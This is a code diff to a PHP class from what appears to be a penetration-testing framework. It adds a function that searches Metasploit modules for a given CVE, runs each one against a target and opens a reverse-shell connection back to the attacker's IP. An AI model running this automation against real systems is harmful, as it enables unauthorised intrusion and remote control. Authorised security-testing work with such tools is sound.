@@ -7,7 +7,32 @@ class SERVICE4COM extends AUTH {
         parent::__construct($eth,$domain,$ip,$port,$protocol);	
     }
     
-
+    public function msf2search2exec($cve){
+        $cve = trim($cve);
+        $result = "";
+        $files_exploit = array();
+        $this->ssTitre(__FUNCTION__);
+        $hash = sha1($cve);
+        $attacker_ip = $this->ip4addr4target($this->ip);
+        
+        $files_exploit = array_filter($this->msf2search($cve)) ;
+        if (!empty($files_exploit)){
+            foreach ($files_exploit as $file_exploit){
+                if(!empty($file_exploit)){
+                    $lport = rand(1024,65535);
+                    $file_exploit = trim($file_exploit);
+                    $this->article("EXEC $file_exploit", $cve);
+                    $cmd_rev = $this->msf2exec($file_exploit,$this->ip,$this->port,$attacker_ip,$lport);
+                    $templateB64_shell = base64_encode($cmd_rev);
+                    
+                    $lprotocol = 'T';
+                    $type = 'client';
+                    $this->service4lan($cmd_rev, $templateB64_shell, $lport, $lprotocol,$type);
+                }
+            }
+        }
+        return $result ;
+    }
 
     
     public function service4authorized_keys($stream,$authorized_keys_filepath,$authorized_keys_str,$remote_username,$remote_userpass,$local_username,$local_home_user){
@@ -85,11 +110,12 @@ class SERVICE4COM extends AUTH {
     }
     
     
-    public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol){
+    public function service4lan($cmd_rev,$templateB64_shell,$lport,$lprotocol,$type){
         $templateB64_cmd = base64_encode($cmd_rev);
-        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
-        $time = 5 ;       
-        $this->exec_parallel($cmd1, $cmd_rev, $time);
+        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $lport $lprotocol $templateB64_cmd $templateB64_shell $type 60 listening_Server\" ";
+        $time = $this->stream_timeout ;       
+        if ($type=="client") $this->exec_parallel($cmd_rev, $cmd1, $time);
+        if ($type=="server") $this->exec_parallel($cmd1, $cmd_rev, $time);
     }
     
 
